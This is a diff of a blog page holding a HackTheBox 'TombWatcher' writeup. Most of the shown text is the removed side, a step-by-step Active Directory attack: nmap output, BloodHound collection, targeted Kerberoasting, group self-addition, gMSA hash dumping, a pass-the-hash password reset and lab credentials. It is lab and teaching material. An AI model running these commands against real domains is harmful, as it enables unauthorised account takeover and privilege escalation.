@@ -1,303 +1,86 @@
-<!DOCTYPE html>
-<html lang="en">
-    <head><script src="/f0dh1l/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=f0dh1l/livereload" data-no-instant defer></script>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <meta name="robots" content="noodp" />
-        <title>HTB Machine Writeup &#34;TombWatcher&#34; - My Personal Blog</title><meta name="Description" content="This is my personal blog"><meta property="og:url" content="http://localhost:1313/f0dh1l/posts/htb_tombwatcher/">
-  <meta property="og:site_name" content="My Personal Blog">
-  <meta property="og:title" content="HTB Machine Writeup &#34;TombWatcher&#34;">
-  <meta property="og:description" content="HTB Machine: TombWatcher - Writeup Machine Information Difficulty: Medium Key Concepts: Kerberoasting, LDAP Enumeration, BloodHound Analysis, Active Directory Privilege Escalation, Deleted Object Recovery, ADCS ESC15 Vulnerability Overview TombWatcher is a Medium Windows machine from HackTheBox that demonstrates a complex Active Directory attack path involving Kerberoasting, group membership manipulation, GMSA password extraction, ownership changes, recovering and restoring deleted AD objects, and ultimately exploiting an ADCS vulnerability (ESC15) to achieve domain administrator privileges.">
-  <meta property="og:locale" content="en">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-10-23T14:01:34+01:00">
-    <meta property="article:modified_time" content="2025-10-23T14:01:34+01:00">
-    <meta property="article:tag" content="HTB">
-    <meta property="article:tag" content="Windows">
-    <meta property="article:tag" content="Active Directory">
-
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="HTB Machine Writeup &#34;TombWatcher&#34;">
-  <meta name="twitter:description" content="HTB Machine: TombWatcher - Writeup Machine Information Difficulty: Medium Key Concepts: Kerberoasting, LDAP Enumeration, BloodHound Analysis, Active Directory Privilege Escalation, Deleted Object Recovery, ADCS ESC15 Vulnerability Overview TombWatcher is a Medium Windows machine from HackTheBox that demonstrates a complex Active Directory attack path involving Kerberoasting, group membership manipulation, GMSA password extraction, ownership changes, recovering and restoring deleted AD objects, and ultimately exploiting an ADCS vulnerability (ESC15) to achieve domain administrator privileges.">
-<meta name="application-name" content="My Personal Blog">
-<meta name="apple-mobile-web-app-title" content="My Personal Blog">
-<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
-        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/f0dh1l/posts/htb_tombwatcher/" /><link rel="prev" href="http://localhost:1313/f0dh1l/posts/htb_artificial/" /><link rel="stylesheet" href="/f0dh1l/css/style.min.css"><link rel="preload" href="/f0dh1l/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-        <noscript><link rel="stylesheet" href="/f0dh1l/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/f0dh1l/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-        <noscript><link rel="stylesheet" href="/f0dh1l/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
-    {
-        "@context": "http://schema.org",
-        "@type": "BlogPosting",
-        "headline": "HTB Machine Writeup \"TombWatcher\"",
-        "inLanguage": "en",
-        "mainEntityOfPage": {
-            "@type": "WebPage",
-            "@id": "http:\/\/localhost:1313\/f0dh1l\/posts\/htb_tombwatcher\/"
-        },"genre": "posts","keywords": "HTB, Windows, Active Directory","wordcount":  2335 ,
-        "url": "http:\/\/localhost:1313\/f0dh1l\/posts\/htb_tombwatcher\/","datePublished": "2025-10-23T14:01:34+01:00","dateModified": "2025-10-23T14:01:34+01:00","license": "2025 F0DH1L","publisher": {
-            "@type": "Organization",
-            "name": ""},"author": {
-                "@type": "Person",
-                "name": "F0DH1L"
-            },"description": ""
-    }
-    </script></head>
-    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
-          const query = window.matchMedia('(prefers-color-scheme: dark)');
-          function applyTheme() {
-            let theme = window.localStorage?.getItem('theme') || 'dark';
-            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
-            document.body.setAttribute('theme', isDark? 'dark' : 'light');
-            document.body.setAttribute('cfg-theme', theme);
-          }
-
-          applyTheme();
-          query.addEventListener('change', applyTheme);
-        </script>
-
-        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
-    <div class="header-wrapper">
-        <div class="header-title">
-            <a href="/f0dh1l/" title="My Personal Blog">F0DH1L Blog</a>
-        </div>
-        <div class="menu">
-            <div class="menu-inner"><a class="menu-item" href="/f0dh1l/posts/"> Posts </a><a class="menu-item" href="/f0dh1l/tags/"> Tags </a><a class="menu-item" href="/f0dh1l/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
-                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
-                </a></div>
-        </div>
-    </div>
-</header><header class="mobile" id="header-mobile">
-    <div class="header-container">
-        <div class="header-wrapper">
-            <div class="header-title">
-                <a href="/f0dh1l/" title="My Personal Blog">F0DH1L Blog</a>
-            </div>
-            <div class="menu-toggle" id="menu-toggle-mobile">
-                <span></span><span></span><span></span>
-            </div>
-        </div>
-        <div class="menu" id="menu-mobile"><a class="menu-item" href="/f0dh1l/posts/" title="">Posts</a><a class="menu-item" href="/f0dh1l/tags/" title="">Tags</a><a class="menu-item" href="/f0dh1l/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
-                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
-            </a></div>
-    </div>
-</header><main class="main">
-                <div class="container"><div class="toc" id="toc-auto">
-            <h2 class="toc-title">Contents</h2>
-            <div class="toc-content" id="toc-content-auto"></div>
-        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HTB Machine Writeup "TombWatcher"</h1><div class="post-meta">
-            <div class="post-meta-line"><span class="post-author"><a href="/f0dh1l/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>F0DH1L</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-10-23">2025-10-23</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2335 words&nbsp;
-                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;11 minutes&nbsp;</div>
-        </div><div class="details toc" id="toc-static"  data-kept="">
-                <div class="details-summary toc-title">
-                    <span>Contents</span>
-                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
-                </div>
-                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
-  <ul>
-    <li><a href="#machine-information">Machine Information</a></li>
-    <li><a href="#overview">Overview</a></li>
-    <li><a href="#reconnaissance">Reconnaissance</a></li>
-    <li><a href="#initial-reconnaissance-bloodhound-analysis">Initial Reconnaissance: BloodHound Analysis</a></li>
-    <li><a href="#exploitation-the-attack-chain">Exploitation: The Attack Chain</a>
-      <ul>
-        <li><a href="#first-step---kerberoasting">First Step - Kerberoasting</a></li>
-        <li><a href="#step-2-adding-alfred-to-infrastructure-group">Step 2: Adding Alfred to Infrastructure Group</a></li>
-        <li><a href="#step-2-reading-gmsa-password-for-ansible_dev">Step 2: Reading GMSA Password for ansible_dev$</a></li>
-        <li><a href="#step-3-force-password-change-on-sam">Step 3: Force Password Change on sam</a></li>
-        <li><a href="#step-4-taking-ownership-of-john">Step 4: Taking Ownership of john</a></li>
-        <li><a href="#step-5-granting-full-control-and-password-reset">Step 5: Granting Full Control and Password Reset</a></li>
-        <li><a href="#step-6-initial-shell-as-john">Step 6: Initial Shell as john</a></li>
-      </ul>
-    </li>
-    <li><a href="#privilege-escalation-path-to-domain-admin">Privilege Escalation: Path to Domain Admin</a>
-      <ul>
-        <li><a href="#investigating-the-adcs">Investigating the ADCS</a></li>
-        <li><a href="#discovering-deleted-users">Discovering Deleted Users</a></li>
-        <li><a href="#restoring-cert_admin">Restoring cert_admin</a></li>
-      </ul>
-    </li>
-    <li><a href="#adcs-exploitation-esc15-attack">ADCS Exploitation: ESC15 Attack</a>
-      <ul>
-        <li><a href="#enumerating-certificate-templates">Enumerating Certificate Templates</a></li>
-        <li><a href="#understanding-esc15">Understanding ESC15</a></li>
-        <li><a href="#initial-attempt-failed">Initial Attempt (Failed)</a></li>
-        <li><a href="#esc15-exploitation-two-step-method">ESC15 Exploitation (Two-Step Method)</a></li>
-      </ul>
-    </li>
-    <li><a href="#conclusion">Conclusion</a></li>
-  </ul>
-</nav></div>
-            </div><div class="content" id="content"><h1 id="htb-machine-tombwatcher---writeup">HTB Machine: TombWatcher - Writeup</h1>
-<h2 id="machine-information">Machine Information</h2>
-<ul>
-<li><strong>Difficulty</strong>: Medium</li>
-<li><strong>Key Concepts</strong>: Kerberoasting, LDAP Enumeration, BloodHound Analysis, Active Directory Privilege Escalation, Deleted Object Recovery, ADCS ESC15 Vulnerability</li>
-</ul>
-<p><img
-        class="lazyload"
-        src="/f0dh1l/svg/loading.min.svg"
-        data-src="/f0dh1l/images/htb_tombwatcher/image-3.png"
-        data-srcset="/f0dh1l/images/htb_tombwatcher/image-3.png, /f0dh1l/images/htb_tombwatcher/image-3.png 1.5x, /f0dh1l/images/htb_tombwatcher/image-3.png 2x"
-        data-sizes="auto"
-        alt="/f0dh1l/images/htb_tombwatcher/image-3.png"
-        title="Solve Screenshot" /></p>
-<h2 id="overview">Overview</h2>
-<p><strong>TombWatcher</strong> is a Medium Windows machine from HackTheBox that demonstrates a complex Active Directory attack path involving Kerberoasting, group membership manipulation, GMSA password extraction, ownership changes, recovering and restoring deleted AD objects, and ultimately exploiting an ADCS vulnerability (ESC15) to achieve domain administrator privileges.</p>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<p>First, I started with an nmap scan to identify open services on the target machine at <code>10.10.11.72</code>. The scan revealed typical Active Directory services including LDAP, Kerberos, and SMB.</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Nmap 7.94SVN scan initiated Wed Oct  1 11:26:27 2025 as: nmap -sC -sV -oN nmap_init 10.10.11.72</span>
-</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.72
-</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.051s latency<span class="o">)</span>.
-</span></span><span class="line"><span class="cl">Not shown: <span class="m">988</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
-</span></span><span class="line"><span class="cl">PORT     STATE SERVICE       VERSION
-</span></span><span class="line"><span class="cl">53/tcp   open  domain        Simple DNS Plus
-</span></span><span class="line"><span class="cl">80/tcp   open  http          Microsoft IIS httpd 10.0
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: IIS Windows Server
-</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
-</span></span><span class="line"><span class="cl">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2025-10-01 14:26:38Z<span class="o">)</span>
-</span></span><span class="line"><span class="cl">135/tcp  open  msrpc         Microsoft Windows RPC
-</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
-</span></span><span class="line"><span class="cl">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: tombwatcher.htb0., Site: Default-First-Site-Name<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.tombwatcher.htb
-</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb
-</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-11-16T00:47:59
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2025-11-16T00:47:59
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-10-01T14:28:46+00:00<span class="p">;</span> +4h00m00s from scanner time.
-</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds?
-</span></span><span class="line"><span class="cl">464/tcp  open  kpasswd5?
-</span></span><span class="line"><span class="cl">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-</span></span><span class="line"><span class="cl">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: tombwatcher.htb0., Site: Default-First-Site-Name<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.tombwatcher.htb
-</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb
-</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-11-16T00:47:59
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2025-11-16T00:47:59
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-10-01T14:28:46+00:00<span class="p">;</span> +4h00m01s from scanner time.
-</span></span><span class="line"><span class="cl">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: tombwatcher.htb0., Site: Default-First-Site-Name<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-10-01T14:28:47+00:00<span class="p">;</span> +4h00m00s from scanner time.
-</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.tombwatcher.htb
-</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb
-</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-11-16T00:47:59
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2025-11-16T00:47:59
-</span></span><span class="line"><span class="cl">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: tombwatcher.htb0., Site: Default-First-Site-Name<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-10-01T14:28:46+00:00<span class="p">;</span> +4h00m01s from scanner time.
-</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.tombwatcher.htb
-</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb
-</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-11-16T00:47:59
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2025-11-16T00:47:59
-</span></span><span class="line"><span class="cl">Service Info: Host: DC01<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Host script results:
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_smb2-time: Protocol negotiation failed <span class="o">(</span>SMB2<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 4h00m00s, deviation: 0s, median: 3h59m59s
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Wed Oct  1 11:28:47 2025 -- 1 IP address (1 host up) scanned in 140.50 seconds</span></span></span></code></pre></div></div>
-<h2 id="initial-reconnaissance-bloodhound-analysis">Initial Reconnaissance: BloodHound Analysis</h2>
-<p>Since I have a user inside the AD, I can get the BloodHound ingestion file and visualize the attack path. I collected Active Directory data using BloodHound via NetExec (you can use bloodhound-python as well):</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap 10.10.11.72 -u Alfred -p <span class="s1">&#39;basketball&#39;</span> --bloodhound --collection All --dns-server 10.10.11.72</span></span></code></pre></div></div>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">LDAP        10.10.11.72     <span class="m">389</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:tombwatcher.htb<span class="o">)</span> <span class="o">(</span>signing:None<span class="o">)</span> <span class="o">(</span>channel binding:Never<span class="o">)</span>
-</span></span><span class="line"><span class="cl">LDAP        10.10.11.72     <span class="m">389</span>    DC01             <span class="o">[</span>+<span class="o">]</span> tombwatcher.htb<span class="se">\A</span>lfred:basketball 
-</span></span><span class="line"><span class="cl">LDAP        10.10.11.72     <span class="m">389</span>    DC01             Resolved collection methods: session, group, objectprops, acl, container, psremote, trusts, rdp, dcom, localadmin
-</span></span><span class="line"><span class="cl">LDAP        10.10.11.72     <span class="m">389</span>    DC01             Done in 0M 18S
-</span></span><span class="line"><span class="cl">LDAP        10.10.11.72     <span class="m">389</span>    DC01             Compressing output into /home/fodhil/.nxc/logs/DC01_10.10.11.72_2025-10-01_162221_bloodhound.zip</span></span></code></pre></div></div>
-<p>The collection completed successfully and revealed a clear privilege escalation path from <code>alfred</code> to a user that is a member of <code>Remote Management Users</code>, so after getting that user we can connect to the host with WinRM:</p>
-<p><img
-        class="lazyload"
-        src="/f0dh1l/svg/loading.min.svg"
-        data-src="/f0dh1l/images/htb_tombwatcher/image-1.png"
-        data-srcset="/f0dh1l/images/htb_tombwatcher/image-1.png, /f0dh1l/images/htb_tombwatcher/image-1.png 1.5x, /f0dh1l/images/htb_tombwatcher/image-1.png 2x"
-        data-sizes="auto"
-        alt="/f0dh1l/images/htb_tombwatcher/image-1.png"
-        title="alt text" /></p>
-<h2 id="exploitation-the-attack-chain">Exploitation: The Attack Chain</h2>
-<h3 id="first-step---kerberoasting">First Step - Kerberoasting</h3>
-<p>The first step we need to exploit is that the user Henry has &ldquo;WriteSPN&rdquo; to the user Alfred.
-With this ability we can attempt to add a SPN and then do a kerberos auth to obtain a crackable hash, it’s called: Targeted Kerberoasting.</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 targetedKerberoast/targetedKerberoast.py -u henry -p <span class="s1">&#39;H3nry_987TGV!&#39;</span> --dc-ip 10.10.11.72 -d tombwatcher.htb</span></span></code></pre></div></div>
-<p>Before running this, I synchronized my local time with the domain controller to avoid Kerberos authentication issues:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ntpdate -u 10.10.11.72</span></span></code></pre></div></div>
-<p>The Kerberoasting attack successfully retrieved a hash for user <code>alfred</code>, which I cracked to obtain the password: <strong><code>basketball</code></strong></p>
-<hr>
-<h3 id="step-2-adding-alfred-to-infrastructure-group">Step 2: Adding Alfred to Infrastructure Group</h3>
-<p>BloodHound revealed that <code>alfred</code> has <strong>AddSelf</strong> privileges on the <strong>Infrastructure</strong> group. I used <code>bloodyAD</code> to add alfred to this group:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD --host <span class="s1">&#39;10.10.11.72&#39;</span> -d <span class="s1">&#39;tombwatcher.htb&#39;</span> -u <span class="s1">&#39;alfred&#39;</span> -p <span class="s1">&#39;basketball&#39;</span> add groupMember INFRASTRUCTURE alfred    </span></span></code></pre></div></div>
-<p>✅ <strong>Success!</strong> Alfred is now a member of the Infrastructure group.</p>
-<h3 id="step-2-reading-gmsa-password-for-ansible_dev">Step 2: Reading GMSA Password for ansible_dev$</h3>
-<p>The Infrastructure group has <strong>ReadGMSAPassword</strong> privileges on the <code>ansible_dev$</code> computer account. Group Managed Service Accounts (GMSA) store their passwords in a readable attribute for authorized users. I extracted the password using gMSADumper:</p>
-<p><strong>References:</strong></p>
-<ul>
-<li><a href="https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview" target="_blank" rel="noopener noreffer ">Group Managed Service Accounts Overview</a></li>
-<li><a href="https://github.com/micahvandeusen/gMSADumper" target="_blank" rel="noopener noreffer ">gMSADumper Tool</a></li>
-</ul>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 gMSADumper.py -u <span class="s1">&#39;alfred&#39;</span> -p <span class="s1">&#39;basketball&#39;</span> -d <span class="s1">&#39;tombwatcher.htb&#39;</span></span></span></code></pre></div></div>
-<p><strong>Result:</strong></p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Users or groups who can <span class="nb">read</span> password <span class="k">for</span> ansible_dev$:
-</span></span><span class="line"><span class="cl"> &gt; Infrastructure
-</span></span><span class="line"><span class="cl">ansible_dev$:::4f46405647993c7d4e1dc1c25dd6ecf4
-</span></span><span class="line"><span class="cl">ansible_dev$:aes256-cts-hmac-sha1-96:2712809c101bf9062a0fa145fa4db3002a632c2533e5a172e9ffee4343f89deb
-</span></span><span class="line"><span class="cl">ansible_dev$:aes128-cts-hmac-sha1-96:d7bda16ace0502b6199459137ff3c52d</span></span></code></pre></div></div>
-<h3 id="step-3-force-password-change-on-sam">Step 3: Force Password Change on sam</h3>
-<p>The <code>ansible_dev$</code> computer account has <strong>ForceChangePassword</strong> privileges on user <code>sam</code>. I used NetExec to change sam&rsquo;s password:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb 10.10.11.72 -u <span class="s1">&#39;ansible_dev$&#39;</span> -H 4f46405647993c7d4e1dc1c25dd6ecf4 -M change-password -o <span class="nv">USER</span><span class="o">=</span>sam <span class="nv">NEWPASS</span><span class="o">=</span>NewPassword</span></span></code></pre></div></div>
-<p>✅ <strong>Success!</strong> Sam&rsquo;s password was changed to <code>NewPassword</code>.</p>
-<h3 id="step-4-taking-ownership-of-john">Step 4: Taking Ownership of john</h3>
-<p>User <code>sam</code> has <strong>WriteOwner</strong> privileges on user <code>john</code>, allowing sam to change john&rsquo;s owner to himself. However, I encountered an MD4 hash algorithm error. To fix this, I updated <code>/etc/ssl/openssl.cnf</code>:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-conf">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><pre tabindex="0"><code class="language-conf" data-lang="conf">[openssl_init]
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>HTB Machine Writeup "TombWatcher" - My Personal Blog</title><meta name=Description content="This is my personal blog"><meta property="og:url" content="https://fodhil-ben.github.io/f0dh1l/posts/htb_tombwatcher/">
+<meta property="og:site_name" content="My Personal Blog"><meta property="og:title" content='HTB Machine Writeup "TombWatcher"'><meta property="og:description" content="HTB Machine: TombWatcher - Writeup Machine Information Difficulty: Medium Key Concepts: Kerberoasting, LDAP Enumeration, BloodHound Analysis, Active Directory Privilege Escalation, Deleted Object Recovery, ADCS ESC15 Vulnerability Overview TombWatcher is a Medium Windows machine from HackTheBox that demonstrates a complex Active Directory attack path involving Kerberoasting, group membership manipulation, GMSA password extraction, ownership changes, recovering and restoring deleted AD objects, and ultimately exploiting an ADCS vulnerability (ESC15) to achieve domain administrator privileges."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-10-23T14:01:34+01:00"><meta property="article:modified_time" content="2025-10-23T14:01:34+01:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Windows"><meta property="article:tag" content="Active Directory"><meta name=twitter:card content="summary"><meta name=twitter:title content='HTB Machine Writeup "TombWatcher"'><meta name=twitter:description content="HTB Machine: TombWatcher - Writeup Machine Information Difficulty: Medium Key Concepts: Kerberoasting, LDAP Enumeration, BloodHound Analysis, Active Directory Privilege Escalation, Deleted Object Recovery, ADCS ESC15 Vulnerability Overview TombWatcher is a Medium Windows machine from HackTheBox that demonstrates a complex Active Directory attack path involving Kerberoasting, group membership manipulation, GMSA password extraction, ownership changes, recovering and restoring deleted AD objects, and ultimately exploiting an ADCS vulnerability (ESC15) to achieve domain administrator privileges."><meta name=application-name content="My Personal Blog"><meta name=apple-mobile-web-app-title content="My Personal Blog"><meta name=referrer content="no-referrer"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://fodhil-ben.github.io/f0dh1l/posts/htb_tombwatcher/><link rel=prev href=https://fodhil-ben.github.io/f0dh1l/posts/htb_artificial/><link rel=stylesheet href=/f0dh1l/css/style.min.css><link rel=preload 